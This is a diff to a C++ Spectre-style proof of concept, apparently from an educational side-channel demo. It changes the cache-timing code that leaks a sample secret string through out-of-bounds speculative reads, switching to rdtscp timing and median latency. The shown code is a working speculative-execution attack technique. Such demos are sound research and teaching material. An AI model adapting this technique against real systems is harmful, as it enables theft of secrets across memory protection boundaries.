@@ -28,10 +28,7 @@
 #include <array>
 #include <cstring>
 #include <iostream>
-#include <memory>
-#include <numeric>
 #include <string>
-#include <string_view>
 #include <tuple>
 #include <vector>
 
@@ -46,8 +43,8 @@
 // However, it is not strictly necessary. The secret _could_ be anywhere
 // relative to the string, as long as there is some attacker-controlled value
 // that could reach it during buffer overflow.
-const std::string_view public_data = "Hello, world!";
-const std::string_view private_data = "It's a s3kr3t!!!";
+const char *public_data = "Hello, world!";
+const char *private_data = "It's a s3kr3t!!!";
 
 // Forces a memory read of the byte at address p. This will result in the byte
 // being loaded into cache.
@@ -76,7 +73,7 @@ static std::pair<int, int> top_two_indices(const RangeT &range) {
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char leak_byte(std::string_view text, int offset) {
+static char leak_byte(const char *data, int offset) {
   // Create an array spanning at least 256 different cache lines, with
   // different cache line available for each possible byte.
   // We can use this for a timing attack: if the CPU has loaded a given cache
@@ -117,17 +114,16 @@ static char leak_byte(std::string_view text, int offset) {
   // cache lines, and even different pages, than any other value.
   BigByte* isolated_oracle = &oracle_array[1];
 
-  const char *data = &text[0];
-
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison. It could be stored on the stack, >=4096
   // bytes away from any other values we use we use (which will be loaded into
   // cache). In this demo, it is more convenient to store it on the heap:
   // it is the _only_) heap-allocated value in this program, and easily removed
   // from cache.
-  auto size_in_heap = std::make_unique<int>(text.size());
+  auto size_in_heap = new int(strlen(data));
 
   std::array<int64_t, 256> latencies = {};
+  std::array<int64_t, 256> sorted_latencies = {};
   std::array<int, 256> scores = {};
   int best_val = 0, runner_up_val = 0;
 
@@ -150,7 +146,7 @@ static char leak_byte(std::string_view text, int offset) {
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
-    int safe_offset = run % text.size();
+    int safe_offset = run % strlen(data);
 
     for (int i = 0; i < 10; ++i) {
       // Remove from cache so that we block on loading it from memory,
@@ -187,25 +183,25 @@ static char leak_byte(std::string_view text, int offset) {
       // On the CPUs this has been tested on, placing values 4096 bytes apart
       // is sufficient to defeat prefetching.
       void *timing_entry = &isolated_oracle[i];
-      _mm_mfence();
-      _mm_lfence();
-      int64_t start = __rdtsc();
+      unsigned int junk;
+      // RDTSCP instruction waits for execution of all preceding instructions.
+      int64_t start = __rdtscp(&junk);
       _mm_lfence();
       force_read(timing_entry);
+      sorted_latencies[i] = latencies[i] = __rdtscp(&junk) - start;
       _mm_lfence();
-      latencies[i] = __rdtsc() - start;
     }
-    _mm_lfence();
-    int64_t avg_latency =
-        std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
+
+    std::sort(sorted_latencies.begin(), sorted_latencies.end());
+    int64_t median_latency = sorted_latencies[128];
 
     // The difference between a cache-hit and cache-miss times is significantly
     // different across platforms. Therefore we must first compute its estimate
     // using the safe_offset which should be a cache-hit.
-    int64_t hitmiss_diff = avg_latency - latencies[data[safe_offset]];
+    int64_t hitmiss_diff = median_latency - latencies[data[safe_offset]];
     int hitcount = 0;
     for (int i = 0; i < 256; ++i) {
-      if (latencies[i] < avg_latency - hitmiss_diff / 2 &&
+      if (latencies[i] < median_latency - hitmiss_diff / 2 &&
           i != data[safe_offset]) ++hitcount;
     }
 
@@ -213,7 +209,7 @@ static char leak_byte(std::string_view text, int offset) {
     // skip it.
     if (hitcount == 1) {
       for (int i = 0; i < 256; ++i) {
-        if (latencies[i] < avg_latency - hitmiss_diff / 2 &&
+        if (latencies[i] < median_latency - hitmiss_diff / 2 &&
             i != data[safe_offset]) ++scores[i];
       }
     }
@@ -234,14 +230,15 @@ static char leak_byte(std::string_view text, int offset) {
       exit(EXIT_FAILURE);
     }
   }
+  delete size_in_heap;
   return best_val;
 }
 
 int main(int argc, char** argv) {
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const int private_offset = private_data.begin() - public_data.begin();
-  for (int i = 0; i < private_data.size(); ++i) {
+  const int private_offset = private_data - public_data;
+  for (int i = 0; i < strlen(private_data); ++i) {
     // On at least some machines, this will print the i'th byte from
     // private_data, despite the only actually-executed memory accesses being
     // to valid bytes in public_data.
